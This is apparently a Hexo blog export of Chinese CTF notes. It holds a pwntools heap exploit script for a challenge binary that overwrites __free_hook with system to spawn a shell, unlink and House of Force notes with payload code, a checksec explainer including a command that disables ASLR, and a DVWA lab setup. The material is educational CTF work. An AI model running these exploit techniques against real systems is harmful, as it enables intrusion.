<h1 id="bg3"><a href="#bg3" class="headerlink" title="bg3"></a>bg3</h1><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">filename = <span class="string">&#x27;pwn3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(filename)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;47.104.143.202&#x27;</span>,<span class="number">25997</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Select:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;PayloadLength:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;BugInfo:&#x27;</span>,content) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line">main_arena_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">log.success(<span class="string">&#x27;main_arena_addr: &#x27;</span> + <span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line"></span><br><span class="line">main_arena_offset = libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br><span class="line">base =main_arena_addr-main_arena_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">free_hook=base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys=base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x7fffffff</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(1,&#x27;b&#x27;*0x30)</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x3f0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x3f0</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x401</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x3f0</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x3f0</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(sys))</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1>]]></content>
      <categories>
        <category>WriteUp/笔记</category>
      </categories>
  </entry>
  <entry>
    <title>checksec</title>
    <url>/article/checksec/</url>
    <content><![CDATA[<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><span id="more"></span>

<p>checksec到底是用来干什么的？</p>
<p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
<p>使用命令：</p>
<p><code>checksec [filename]</code></p>
<p>我们在ubuntu下使用它时，会显示有5行信息：</p>
<p><img src="https://img-blog.csdnimg.cn/2020111011454314.png#pic_center" alt="在这里插入图片描述"></p>
<h2 id="1-Arch"><a href="#1-Arch" class="headerlink" title="1.Arch"></a>1.Arch</h2><p>从这行信息可以知道程序是32bit还是64bit的</p>
<h2 id="2-RELRO"><a href="#2-RELRO" class="headerlink" title="2.RELRO"></a>2.RELRO</h2><p>Full Relro（重定位表只读）</p>
<p>Relocation Read Only， 重定位表只读。重定位表即.got 和 .plt 两个表。</p>
<h2 id="3-Stack"><a href="#3-Stack" class="headerlink" title="3.Stack"></a>3.Stack</h2><p>显示Stack：No canary found则表示可以利用栈溢出</p>
<p>Canary在pwn中是什么呢？<br>Canary翻译金丝雀。金丝雀原来是石油工人用来判断气体是否有毒。<br>而应用于在栈保护上则是在初始化一个栈帧时在栈底（stack overflow 发生的高位区域的尾部）设置一个随机的 canary 值，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生，若改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。 因此我们需要获取 Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。</p>
<p>编译时控制是否开启栈保护以及程度：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -o test test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-<span class="built_in">all</span> -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>

<h2 id="4-NX"><a href="#4-NX" class="headerlink" title="4.NX"></a>4.NX</h2><p>NX enable（不可执行内存）</p>
<p>最常见的方法为 ROP (Return-Oriented Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。</p>
<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gcc -z execstack -o test test.c</span><br></pre></td></tr></table></figure>

<h2 id="5-PIE（ASLR）"><a href="#5-PIE（ASLR）" class="headerlink" title="5.PIE（ASLR）"></a>5.PIE（ASLR）</h2><p>称作 地址空间分布随机化（ASLR）<br>内存地址随机化机制（address space layout randomization)，有以下三种情况</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> - 表示关闭进程地址空间随机化。</span><br><span class="line"><span class="number">1</span> - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line"><span class="number">2</span> - 表示在<span class="number">1</span>的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>

<p>liunx下关闭PIE的命令如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo -s echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>


<h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p><a href="https://www.jianshu.com/p/31449fdfe35f">Checksec</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>checksec</tag>
      </tags>
  </entry>
  <entry>
    <title>docker</title>
    <url>/article/docker/</url>
    <content><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><!-- 文章页 配置 -->

<h2 id="DVWA-docker"><a href="#DVWA-docker" class="headerlink" title="DVWA_docker"></a>DVWA_docker</h2><p>因为上课需要，所以在服务器用docker搭了个DVWA</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;MyKings&#x2F;docker-vulnerability-environment.git</span><br><span class="line">cd docker-vulnerability-environment&#x2F;</span><br><span class="line">cd DVWA&#x2F;</span><br><span class="line">docker build -t dvwa .</span><br><span class="line">docker run -d --name dvwa_vul -p 0.0.0.0:8003:80 dvwa</span><br></pre></td></tr></table></figure>

<p>访问服务器8003端口</p>
<p>DVWA 账号： admin/password</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>Heap_Learn</title>
    <url>/article/Heap_Learn/</url>
    <content><![CDATA[<h1 id="Heap-Learn"><a href="#Heap-Learn" class="headerlink" title="Heap_Learn"></a>Heap_Learn</h1><p>各种手法简单总结</p>
<span id="more"></span>

<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk </span><br><span class="line">| 		prev_size		 |	  	size  		|A|M|P|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| user data	(fd)		 |	 	(bk)			  |</span><br><span class="line">|												|</span><br><span class="line">|												|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk</span><br></pre></td></tr></table></figure>

<p><strong>prev_size</strong>，物理相邻的前一个chunk是空闲的话，则记录前一个chunk的大小（包括chunk头）；<br>                    若前一个chunk处于使用状态，则可以存储前一个chunk的数据。<strong>这是 chunk 中的空间复用</strong></p>
<p><strong>size</strong>，必须是 2 * SIZE_SZ 的整数倍。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</p>
<ul>
<li>A：NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
</ul>
<ul>
<li><p>M：IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p>
</li>
<li><p>P：<strong>PREV_INUSE</strong>，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
</li>
</ul>
<p><strong>fd</strong>，<strong>bk</strong> 。chunk在分配状态下存储数据，在free了chunk之后：</p>
<ul>
<li>fd 指向下一个空闲的chunk（非物理相邻）</li>
<li>bk指向上一个空闲的chunk（非物理相邻）</li>
</ul>
<h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞的产生与边界验证不严和字符串操作有关，包括</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
<li>字符串操作不合适</li>
</ul>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p>
</li>
<li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p>
<p>（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</p>
<p>（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code>     找到的块的大小与<code>prev_size</code> 是否一致。</p>
</li>
</ol>
<h1 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h1><p>当 large bin 中只存在一个chunk，那么该 chunk 的两个 nextsize指针都会指向自己</p>
<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>
<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>
</ol>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target = <span class="number">0x6020c8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)	<span class="comment"># fake chunk heard</span></span><br><span class="line">payload += p64(fd) + p64(bk)	<span class="comment"># target_fd target_bk</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>			    <span class="comment"># other data</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>) <span class="comment"># prev_size chunk1 ,next chunk not fastbin</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0xca2020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000041</span>	<span class="comment"># chunk0</span></span><br><span class="line"><span class="number">0xca2030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000030</span>	<span class="comment"># fake chunk heard</span></span><br><span class="line"><span class="number">0xca2040</span>:	<span class="number">0x00000000006020b0</span>	<span class="number">0x00000000006020b8</span>	<span class="comment"># target_fd target_bk</span></span><br><span class="line"><span class="number">0xca2050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>	<span class="comment"># other data</span></span><br><span class="line"><span class="number">0xca2060</span>:	<span class="number">0x0000000000000030</span>	<span class="number">0x0000000000000090</span>  <span class="comment"># prev_size chunk1</span></span><br><span class="line"><span class="number">0xca2070</span>:	<span class="number">0x0000000a62626200</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xca2080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xca2090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xca20a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xca20b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xca20c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xca20d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xca20e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xca20f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000041</span></span><br><span class="line"><span class="number">0xca2100</span>:	<span class="number">0x0000000a63636363</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xca2110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xca2120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xca2130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020ed1</span></span><br><span class="line"><span class="number">0xca2140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>chunk0 写入的内容会在 target-0x18 的位置</p>
<h1 id="House"><a href="#House" class="headerlink" title="House"></a>House</h1><h2 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h2><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ul>
<li>能控制 top chunk 的 size 域（如堆溢出）</li>
<li>能够自由地控制堆分配尺寸的大小（如申请负数的堆）</li>
</ul>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul>
<li>向上申请 chunk</li>
<li>相当于实现任意地址写</li>
</ul>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/article/Hello%20World/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! </p>
<span id="more"></span>
<p>This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Hexo_build</title>
    <url>/article/Hexo_build/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d65fc150bda30a4734b955a9fd802d46c486f50d8feb33e497007c2d4881feba">10d79030e8222445804370796b90fca1b3149e2c2a0f36d6b4ea04e548758c212f8223fc63b8042cf01da1253218a75f75ea6f095928ef71a6be1a1e558de7db286d67e214500a4f2bc4dea514a73e615166196eba6bb744ba0f84bc35704eb1d2374d1580a3590e945026dd20287cecea7b48f724ed143952d4a5a70e31f888435431ddf1e4f77671fe2d9e86e54ae760803c812dac7058f7309302f673ddf33340081500d89717b0936fd7f2aa987e235b4b18b56354470a52ab6fed5854055d42d58af2e077bbb775438abb3b8bd6a39f6adbd4d1c99cac354587fa9da49ffab2af201ef615792f1bdb2b9f2adaed24745ccdc1f204c89e00cb062ae602d9fccf42857780ea4b5e2faab27087caf17cd28138bb13ee59b3195ccda4325cd1b52491ebe9792517a2735e9f5f8ee9ab5502fc05b9950f85d4497721fd927ae1aa98dae3604a8a9f8a034e59ba2d7b44e1ba47ecbd8cdb9a9f66bb9185456ef8f5b63571f40cf0ba239ff5d3ea57e86045e2d36e22c4848e5a7b0632a9806f27e6a641b6fb14fee9026df5f9bfcc440aac680577bf786252a02d9d02a78c1b84178995055876d318874f3cd77cf377377697c1f2edfbd9fc1043d5aa0b0e631b34379278d798db059cc2341e70ac4ab151a3a5156b6100c1f8ec6064aa328c49c47dbbe9c068abf238eed3354f8ae9831dea9c85129181bd596f4ae79cfc56291fbae2fe78b3c8f48cd78edd414f3667df1919d3d95f41043798162a4808fecf0ad7e3ef22cef078414c2e3330f6385343bb04ec2b8a177aedfc09bd8096634af536b7ac5acfe570fe793d879b4ee4b09734ee7f7aeb1967f5ebe7af540211400720132ceb4539cf48e0f626eb5824d13bbbe266ac57bf84678610494ee2fb6a1f8c6e68a8e764706f883fd6309b85b212b3b5fa63d7b47b859ed854e93feb89cb2485f3bd15e9058aae8978ce1b1f26950a2b5a0f86f3dac32e657a197733b7df3aeb1f71ad9af5ec5de4a074ff3224969121eeb764c421112119f6c4073de1cafc6f75eca8319e11b3a374338b7af807c7032a57ec66ac89823e9462787fcafcb7a881185222b8af40fdf87ec40988e5d5cd275f68e89e492e16edd0ca676c956f4f47adfcd0b7a542db4cb18a76e6296d054d9cbbf7c922f5e7f0255a35f6d41ff50cc3eb695675105ceafa3fd6bba3cd31d08262382d000e652f9b6452fafdc458e5d33165ca67e442b36326c638f39820c9034d95a6919de0c93837b11490b62550fe41dbc1b712a37fd9ad83179f623dc81f8a77eebf987eb2a14a99ea86453fa315977e20d82ca63daa9b203e745bf3487882e7a21efe73e3705630f7628adcfbefc5f15a3b75581d9f0767aeb7963d7531e9fad40f70d63e843adf9cadb267e9023f24af8381214c9030acf5eda38ac783c6cc54eeb7709d8ef0a56e626c0d1c1a969d0df91a34e0076ff5398a6ca5acf7091001a9cc3a0da57b05e83bdf5872818010e6527e0da3dd53f2fc99f421aa69bcba3ae343d3c9faa12665962e963785aca7c7695feeca27471af08b8ad05c055bb5f6125e2968e78d4de9c313de871c35d6a4b87e768b237a02eb591456376ee4112cdf902f9adecc6b74411d3ed394bf24898e0c6c0da545b782a8dded584f37155ebf1851ac83e5216aa95c16e67b473fe4d604141a6d1d91d628fdd46f3add3ca2a51f334020901f1bdb604270e486086197c8709be5b90baa2c62105f3e2c777858fc4eb40ab714c8cd4adea96ff1c69ab027724699f6ba84965822d2d491f1cd6785e8fd975cc515b4705be41684b7e3b077e4907b1e4883376c6bb37e30026d25bdd7f6262af5d7bd4d25ba0221ff741c8aca4c9913d90cafb525d67c4aa2abb5536c635768758f6bf7880640af8f24d752f58caae58d37d8262f636cd48ea9f10a09bc43487ceb73cf3ab404457e9c90a90fb82094a06e87364ce433a44ec77269494aef59cc5e86af7d84c1dc015b9426197fd34118675c0692a9f4dcb870af486d7fe4a7938d1aaaa90c893826a69cd5bc7b7b0b2dfd2ed38178dac80412bcf548a12842b83d68d12f5c227989078774006c59a7f03086d24f0ae4bc585923db199039d9867bfb4e571562cdb4cd255ca59e0172dbf7c4d7a0a395c02061dc3fc41ad6b8d56f36538bdce73c84fef4686016d201c1dc9a9b4d09e0b309397e70674a14c6a36cab536dd3dfaccf312f6b799a9a1a49d17ea35a0f766beb179f273f92d7eec1bd66b77e0f563328522f837a1c10ef053116befd830d892273b7ee74a1d45eadbc61736c88d0bffa2d7a163db9bf19f0002a8e49f4e5d7366cd4d2c425636b037430d9098949f5fb197900a49be6109fbf11f76e04f5060476da838b8561715fef10716a8c4cfe69515921457de9ca9a5a1e56ddad6d265fce6779efe771bf56ce9c0e5e876cf23c7edf81489c2b3f150a1d374048973b1fbea0bc110ce396acbe73886bbc57c492658a140043479aa8d2335611b4d233d7a43d22f45555dd2e7a5cc2f07962dbf9f1317d0f2fcd606e2d2fc3d5911082c50d5a2d9f7a94bfd779d3339767539a9a36cafbb28394ea3ccf621031ce7484ac0f5d9601c89115e4dbb24fad038b7f552f016e1d5ba008df12ddefcdd3159e91e62739f73b1f7994f2d6f22e5277810051f100e19d49582b79441b839689e878c6c563211d7061f4f9657fd4f9d26629b83bf0c58d6be183921d53dd2a4afed0bc97cc8423de71f1977f103e87eb1808fea3396a67b1bd7dde3889da518050c8ef4fcd836000f17cdf5fb880ef834c5e97e1bfa5e7d3eefa5a13f2f896bca568fdf3b8b2e107e0ba4154ebf3662fd5367359fda3222eabe4b8f8d530de3aa91588309a038985eed7afcf80a5d92861b0dfac20a533505e4f1e98fa44e19a10a69465a4f7fcf8defede39081bbbc21f2678685321365f6d36843aa0297eb43c71514074e86315bf76004f3717e95c4dbc3c66c48e0693c10d3ce4c8cde3b6a52a46fb45c9e885bfeb9d4cba314b00ff8a535dc1ce32a9648b953f6e54e25917072b38a6c1e73402635b639ea232541ffaae607a7f81c5b087a1f61b1337e5562321be3dfea8bf6c3ae40b0413799e7b9129e4958536437b78c462cbb0281b4bd53a848ec67688a9e9aebf699a888b93bdf2c741dcd549d3864b2f7898e45ef9ead07425c0ed55d9b7ac1a3e6042d5254b8a38639c362bf34fd9e150648ddf5a9d39abf59a9f03d5eee763a34c75bfb63f90f1056f57cb86d74e49471b8fc18950d0108809c59b8e1a03d02cc69914d13c6377a332ca17770b99725f27ca383a5eb01243e98b2f07a4e2df72e8cf1459126da5cfa5838f028fbbf9c85d3261a321dd04186b2d6b2027f381e207036dfa28ab143efade75934efaf87c7c365e3405a95a626c02c2c7d14ed5ee2d63d4aba6f70d0ff646139acdeb925c4880bc723e4e25d35a3e8a1c1d927667e448724fb515a7f1e9800886cd5d78bc009833231a21453dc7bdd2b850e2d1d72d976eab91fc8f7176ad36008bacac06ce577b99a11bca762d7dab369154a5fba173a3155168770c0bb332a91b6768044b7a86fa9a6783e9c5f1144337f0e19ff434193525c4f99de4176e558ed5bac51e282c04f0a1af573309c3e9d084e92d3bf706c329596811513e3dad5c9e6ffe7da7129918ba9968a648a10be9364a4dee99dfee380cf85ee8d1192eb92cb5c0f9c507b1309184731e0f71d96f898abab4dd744145f8d7bec17653bfbb2f9c93ba8539c6b67dac9743f129c252c661ef9f8ebbeb08596905e4b4e745d393463319f3547d97ecebf416045aa03ab69707f074d2fbf7fafc6b286f672b3736835c2c2a77ed0e058dea4cdf2ce93a8e66459a33cc5fe8b05bfbde68a3d6580fe5a856ea68fcd355584fe66b6771db2336246ec17f36b8dd4dac7bf4417bd1811c8646b56644b7570de5456502c811d2dfbea48270f94af71424085a54e9cefa07547a9237950952d458c1ec665b180610f2d5ac691febbc6041373e675a93b9785ec7e7113b89f91501f8c94859c27cd135622962f6695083acceaf0c9061352d513673ae43ba6ea35543d4fde2fbd5b7f487460096626ae60c506f4f46cae7bc500c3bb94056abc8df0f471d02d35cdef492f6eb47896768b32ed8968bec31cc7c76d7fb6db8fb51270788cbfeef9bcb4709385a99278ecd067ed4e6269f37d117c0b1f20465e89754c578f0ff471a381cc50ac756271968a9b6cd924161f90b036e4bb30905918200102319d9adfadbd5dcb7c613b1081009778551a7fdb63ad6bf69c96230fe13c4224679c078e99e5a3fe639638edf18e8eda7138ee3d8c4eba92ca4601b2f4aa969b53647773b44ed420f305f9603fd7f401e32e2792d8a0d